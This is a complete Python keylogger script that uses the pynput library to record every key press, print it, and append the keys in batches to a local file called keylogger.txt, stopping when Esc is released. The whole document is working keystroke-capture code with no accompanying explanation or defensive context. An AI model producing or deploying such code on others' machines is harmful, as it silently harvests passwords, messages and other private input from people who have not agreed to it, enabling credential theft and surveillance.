import logging
from pynput import keyboard

logging.basicConfig(filename="keylogger.txt", level=logging.INFO, format="%(message)s")
keys = []

def on_press(key):
    global keys

    keys.append(key)
    print("{0} pressed".format(key))

    if len(keys) >= 20 or key == keyboard.Key.space or key == keyboard.Key.enter:
        write_to_file()
        keys.clear()

def write_to_file():
    with open("keylogger.txt", "a") as logKey:
        for key in keys:
            logKey.write("{0}\n".format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()